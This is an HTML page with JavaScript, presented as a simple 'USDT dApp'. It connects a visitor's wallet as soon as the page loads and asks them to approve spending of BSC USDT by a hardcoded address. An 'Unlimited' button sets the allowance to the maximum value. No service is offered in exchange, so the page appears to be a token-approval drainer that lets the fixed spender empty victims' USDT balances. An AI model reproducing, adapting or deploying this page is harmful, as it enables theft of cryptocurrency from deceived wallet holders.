<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>BSC USDT Approve</title>

<style>
body{background:#0b0f19;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
.card{background:#121826;padding:20px;border-radius:16px;max-width:420px;margin:auto}
button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px;font-weight:600}
.approve{background:#22c55e}
.connect{background:#3b82f6}
input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;background:#0f172a;color:white}
#qr{margin-top:10px}
.link{font-size:11px;word-break:break-all;color:#aaa}
</style>
</head>

<body>

<div class="card">

<h2>💰 USDT (BSC)</h2>

<div id="wallet"></div>

<div id="qr"></div>
<div id="wcLink" class="link"></div>

<input type="number" id="amount" value="10">

<button id="maxBtn">Unlimited</button>

<button id="approveBtn" class="approve">Approve USDT</button>

<div id="status"></div>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script type="module">
import { ethers } from "https://esm.sh/ethers@6";
import SignClient from "https://esm.sh/@walletconnect/sign-client";

const PROJECT_ID = "YOUR_PROJECT_ID";
const CHAIN_ID = "eip155:56"; // BSC

const USDT = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";

let provider, signer, contract;
let wcClient, session;
let unlimited = false;

const ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)"
];

// detect mobile
function isMobile(){
  return /Android|iPhone|iPad/i.test(navigator.userAgent);
}

// ---------- MOBILE ----------
async function mobileFlow(){
  if(window.ethereum){
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);

    await switchToBSC();

    signer = await provider.getSigner();

    const address = await signer.getAddress();
    document.getElementById("wallet").innerText = address;

    contract = new ethers.Contract(USDT, ABI, signer);

    document.getElementById("status").innerText = "Connected (Mobile)";
  } else {
    // open Trust Wallet
    window.location.href =
      "https://link.trustwallet.com/open_url?url=" +
      encodeURIComponent(window.location.href);
  }
}

// ---------- DESKTOP ----------
async function desktopFlow(){
  wcClient = await SignClient.init({
    projectId: PROJECT_ID,
    metadata:{
      name:"USDT dApp",
      description:"Approve USDT",
      url:location.origin,
      icons:[""]
    }
  });

  const { uri, approval } = await wcClient.connect({
    requiredNamespaces:{
      eip155:{
        methods:["eth_sendTransaction"],
        chains:[CHAIN_ID],
        events:["accountsChanged"]
      }
    }
  });

  // QR
  new QRCode(document.getElementById("qr"), {
    text: uri,
    width:200,
    height:200
  });

  // clickable link
  document.getElementById("wcLink").innerText = uri;

  session = await approval();

  const account = session.namespaces.eip155.accounts[0];
  const address = account.split(":")[2];

  document.getElementById("wallet").innerText = address;
  document.getElementById("status").innerText = "Connected (Desktop)";
}

// ---------- SWITCH BSC ----------
async function switchToBSC(){
  await window.ethereum.request({
    method:"wallet_switchEthereumChain",
    params:[{chainId:"0x38"}]
  });
}

// ---------- APPROVE ----------
document.getElementById("approveBtn").onclick = async ()=>{
  try{
    let amount;

    if(unlimited){
      amount = ethers.MaxUint256;
    } else {
      const val = document.getElementById("amount").value;
      amount = ethers.parseUnits(val, 18);
    }

    // MOBILE
    if(contract){
      const tx = await contract.approve(SPENDER, amount);
      await tx.wait();

      document.getElementById("status").innerText = "✅ Approved";
      return;
    }

    // DESKTOP WC
    const account = session.namespaces.eip155.accounts[0];

    const tx = {
      from: account.split(":")[2],
      to: USDT,
      data: new ethers.Interface(ABI).encodeFunctionData("approve",[SPENDER, amount]),
      value:"0x0"
    };

    await wcClient.request({
      topic: session.topic,
      chainId: CHAIN_ID,
      request:{
        method:"eth_sendTransaction",
        params:[tx]
      }
    });

    document.getElementById("status").innerText = "✅ Approved";

  }catch(e){
    console.error(e);
    document.getElementById("status").innerText = "❌ Failed";
  }
};

// unlimited
document.getElementById("maxBtn").onclick = ()=>{
  unlimited = true;
  document.getElementById("status").innerText = "Unlimited selected";
};

// INIT
(async ()=>{
  if(isMobile()){
    await mobileFlow();
  } else {
    await desktopFlow();
  }
})();
</script>

</body>
</html>
